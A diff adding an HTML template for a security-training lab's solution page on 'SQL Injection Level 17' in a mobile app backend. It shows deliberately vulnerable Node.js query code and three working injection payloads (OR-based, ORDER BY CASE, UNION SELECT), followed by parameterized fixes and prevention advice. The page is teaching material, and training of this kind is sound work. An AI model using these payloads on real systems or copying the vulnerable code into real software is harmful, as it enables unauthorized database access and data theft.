@@ -1,0 +1,294 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: SQL Injection Level 17{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 17 - SQL Injection in Mobile App Backend</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates a SQL injection vulnerability in a mobile application's backend API. Mobile apps typically communicate with backend servers through APIs, often using JSON or XML for data exchange. These APIs can be vulnerable to the same types of injection attacks as web applications, including SQL injection.
+                </p>
+                <p>
+                    The vulnerability occurs because:
+                </p>
+                <ul>
+                    <li>The backend API processes data received from the mobile app</li>
+                    <li>This data is used directly in SQL queries without proper validation or parameterization</li>
+                    <li>The API fails to properly sanitize or escape special characters in the mobile app's requests</li>
+                </ul>
+                <p>
+                    This type of vulnerability is particularly dangerous because mobile API traffic is often less scrutinized than web traffic, and developers may assume that since the API is only accessed by their mobile app, it's inherently secure.
+                </p>
+
+                <h3>The Vulnerable Code</h3>
+                <p>
+                    The vulnerability exists in how the backend API processes the JSON data from the mobile app and uses it in SQL queries. Here's a simplified example of the vulnerable code:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>// Vulnerable code example (Node.js with Express and MySQL)
+app.post('/api/v1/products', (req, res) => {
+  const data = req.body;
+
+  // Extract values from the request
+  const action = data.action;
+  const category = data.category || '';
+  const sort = data.sort || 'price_asc';
+  const limit = data.limit || 10;
+
+  if (action === 'getProducts') {
+    // Construct the SQL query
+    let query = `SELECT product_id, name, description, price, image_url
+                FROM products
+                WHERE active = 1`;
+
+    // Add category filter if provided
+    if (category) {
+      query += ` AND category = '${category}'`;
+    }
+
+    // Add sorting
+    query += ` ORDER BY ${sort}`;
+
+    // Add limit
+    query += ` LIMIT ${limit}`;
+
+    // Execute the query
+    db.query(query, (err, results) => {
+      if (err) {
+        return res.status(500).json({ error: 'Database error' });
+      }
+
+      res.json({ products: results });
+    });
+  } else {
+    res.status(400).json({ error: 'Invalid action' });
+  }
+});</code></pre>
+                <p>
+                    The vulnerability is in the direct use of <code>category</code> and <code>sort</code> parameters in the SQL query without proper sanitization or parameterization.
+                </p>
+
+                <h3>Solution</h3>
+                <p>To exploit this vulnerability, follow these steps:</p>
+
+                <h4>1. Understand the API Request Format</h4>
+                <p>
+                    First, we need to understand the format of the API requests used by the mobile app. Based on the challenge description and the default request template, the API uses JSON-formatted requests with several fields:
+                </p>
+                <ul>
+                    <li><code>action</code>: The operation to perform (e.g., "getProducts")</li>
+                    <li><code>category</code>: The product category to filter by</li>
+                    <li><code>sort</code>: The field and direction to sort by</li>
+                    <li><code>limit</code>: The maximum number of products to retrieve</li>
+                </ul>
+
+                <h4>2. Identify the Vulnerable Parameters</h4>
+                <p>
+                    Based on the challenge description and the request format, both the <code>category</code> and <code>sort</code> parameters are likely vulnerable to SQL injection. The <code>category</code> parameter is enclosed in single quotes in the SQL query, while the <code>sort</code> parameter is used directly without quotes.
+                </p>
+
+                <h4>3. Craft a SQL Injection Payload for the Category Parameter</h4>
+                <p>
+                    We can craft a payload that exploits the SQL injection vulnerability in the <code>category</code> parameter to access the restricted product with ID 999:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>{
+  "action": "getProducts",
+  "category": "electronics' OR product_id=999 OR category='",
+  "sort": "price_asc",
+  "limit": 10
+}</code></pre>
+                </div>
+                <p>
+                    When this API request is processed, the resulting SQL query will be:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT product_id, name, description, price, image_url
+FROM products
+WHERE active = 1 AND category = 'electronics' OR product_id=999 OR category=''
+ORDER BY price_asc
+LIMIT 10</code></pre>
+                <p>
+                    This query will return products in the electronics category as well as the product with ID 999, regardless of its category or active status.
+                </p>
+
+                <h4>4. Alternative Approach: Exploiting the Sort Parameter</h4>
+                <p>
+                    We can also exploit the <code>sort</code> parameter, which is used directly in the SQL query without quotes:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>{
+  "action": "getProducts",
+  "category": "electronics",
+  "sort": "(CASE WHEN product_id=999 THEN 0 ELSE 1 END), price_asc",
+  "limit": 10
+}</code></pre>
+                </div>
+                <p>
+                    This will cause the application to execute:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT product_id, name, description, price, image_url
+FROM products
+WHERE active = 1 AND category = 'electronics'
+ORDER BY (CASE WHEN product_id=999 THEN 0 ELSE 1 END), price_asc
+LIMIT 10</code></pre>
+                <p>
+                    This query will sort the product with ID 999 to the top of the results if it exists in the electronics category. However, this approach might not work if the product is in a different category or is marked as inactive.
+                </p>
+
+                <h4>5. More Advanced Approach: UNION-based Injection</h4>
+                <p>
+                    For a more reliable approach, we can use a UNION-based injection in the <code>category</code> parameter:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>{
+  "action": "getProducts",
+  "category": "electronics' UNION SELECT product_id, name, description, price, image_url FROM products WHERE product_id=999 -- ",
+  "sort": "price_asc",
+  "limit": 10
+}</code></pre>
+                </div>
+                <p>
+                    This will cause the application to execute:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT product_id, name, description, price, image_url
+FROM products
+WHERE active = 1 AND category = 'electronics' UNION SELECT product_id, name, description, price, image_url FROM products WHERE product_id=999 -- '
+ORDER BY price_asc
+LIMIT 10</code></pre>
+                <p>
+                    This query will return products in the electronics category as well as the product with ID 999, regardless of its category or active status. The <code>--</code> comments out the rest of the query, preventing syntax errors.
+                </p>
+
+                <h4>6. Send the API Request</h4>
+                <p>
+                    To exploit the vulnerability, we need to send our crafted API request to the server. In the challenge interface, we can paste our payload into the API Request textarea and click the "Send API Request" button.
+                </p>
+                <p>
+                    When the server processes our request, it will execute the injected SQL query and return the restricted product containing the flag.
+                </p>
+
+                <h3>Real-world Impact</h3>
+                <p>
+                    SQL injection vulnerabilities in mobile app backends are particularly relevant in:
+                </p>
+                <ul>
+                    <li><strong>E-commerce Apps</strong>: Shopping apps that handle customer and product data</li>
+                    <li><strong>Banking Apps</strong>: Financial applications that process sensitive transaction data</li>
+                    <li><strong>Social Media Apps</strong>: Platforms that store user profiles and content</li>
+                    <li><strong>Healthcare Apps</strong>: Medical applications that handle patient information</li>
+                </ul>
+                <p>
+                    The impact of these vulnerabilities can be severe:
+                </p>
+                <ul>
+                    <li>Unauthorized access to sensitive customer data</li>
+                    <li>Exposure of payment information</li>
+                    <li>Manipulation of product prices or inventory</li>
+                    <li>Complete compromise of the database</li>
+                </ul>
+
+                <h3>Prevention</h3>
+                <p>To prevent SQL injection vulnerabilities in mobile app backends, developers should:</p>
+                <ul>
+                    <li>
+                        <strong>Use Parameterized Queries</strong> or prepared statements:
+                        <pre class="bg-light p-3 rounded"><code>// Safe code example (Node.js with Express and MySQL)
+app.post('/api/v1/products', (req, res) => {
+  const data = req.body;
+
+  // Extract values from the request
+  const action = data.action;
+  const category = data.category || '';
+  const sort = data.sort || 'price_asc';
+  const limit = parseInt(data.limit) || 10;
+
+  if (action === 'getProducts') {
+    // Validate sort parameter against allowed values
+    const allowedSortFields = ['price_asc', 'price_desc', 'name_asc', 'name_desc'];
+    if (!allowedSortFields.includes(sort)) {
+      return res.status(400).json({ error: 'Invalid sort parameter' });
+    }
+
+    // Construct the SQL query with placeholders
+    let query = 'SELECT product_id, name, description, price, image_url FROM products WHERE active = 1';
+    let params = [];
+
+    // Add category filter if provided
+    if (category) {
+      query += ' AND category = ?';
+      params.push(category);
+    }
+
+    // Add sorting (using a switch statement for safety)
+    switch (sort) {
+      case 'price_asc':
+        query += ' ORDER BY price ASC';
+        break;
+      case 'price_desc':
+        query += ' ORDER BY price DESC';
+        break;
+      case 'name_asc':
+        query += ' ORDER BY name ASC';
+        break;
+      case 'name_desc':
+        query += ' ORDER BY name DESC';
+        break;
+    }
+
+    // Add limit
+    query += ' LIMIT ?';
+    params.push(limit);
+
+    // Execute the query with parameters
+    db.query(query, params, (err, results) => {
+      if (err) {
+        return res.status(500).json({ error: 'Database error' });
+      }
+
+      res.json({ products: results });
+    });
+  } else {
+    res.status(400).json({ error: 'Invalid action' });
+  }
+});</code></pre>
+                    </li>
+                    <li>
+                        <strong>Validate and Sanitize API Input</strong>:
+                        <ul>
+                            <li>Validate input types and formats</li>
+                            <li>Use whitelists for allowed values</li>
+                            <li>Implement JSON Schema validation for API requests</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Implement Proper API Authentication and Authorization</strong>:
+                        <ul>
+                            <li>Use strong authentication mechanisms (e.g., OAuth 2.0, JWT)</li>
+                            <li>Implement role-based access control</li>
+                            <li>Verify user permissions before executing database queries</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Use API Security Best Practices</strong>:
+                        <ul>
+                            <li>Implement rate limiting to prevent brute force attacks</li>
+                            <li>Use HTTPS for all API communications</li>
+                            <li>Consider using an API gateway with security features</li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level17') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
